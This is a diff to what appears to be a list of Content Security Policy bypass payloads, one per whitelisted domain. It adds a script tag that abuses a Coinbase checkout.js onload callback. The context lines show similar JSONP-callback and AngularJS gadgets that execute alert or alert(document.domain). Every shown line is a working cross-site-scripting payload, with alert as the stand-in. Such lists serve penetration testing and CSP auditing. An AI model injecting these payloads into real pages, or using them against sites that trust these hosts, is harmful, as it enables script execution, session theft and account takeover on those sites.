@@ -51,6 +51,7 @@ cdnjs.cloudflare.com	<script src="https://cdnjs.cloudflare.com/ajax/libs/alpinej
 cdnjs.cloudflare.com	<body ng-app ng-csp><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.5/angular.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 client-api.arkoselabs.com	<script src="https://client-api.arkoselabs.com/fc/a/?callback=alert"></script>
 code.angularjs.org	<body ng-app ng-csp><script src="https://code.angularjs.org/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+commerce.coinbase.com	<script src="https://commerce.coinbase.com/v1/checkout.js?onload=alert"></script>
 connect.mail.ru	<script src="https://connect.mail.ru/share_count?url_list=x&callback=1&func=alert"></script>
 cse.google.com	<script src="https://cse.google.com/cse/element/v1?cx=000470283453218169915:hcrzdwsiwrc&callback=alert"></script>
 d.adroll.com	<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>
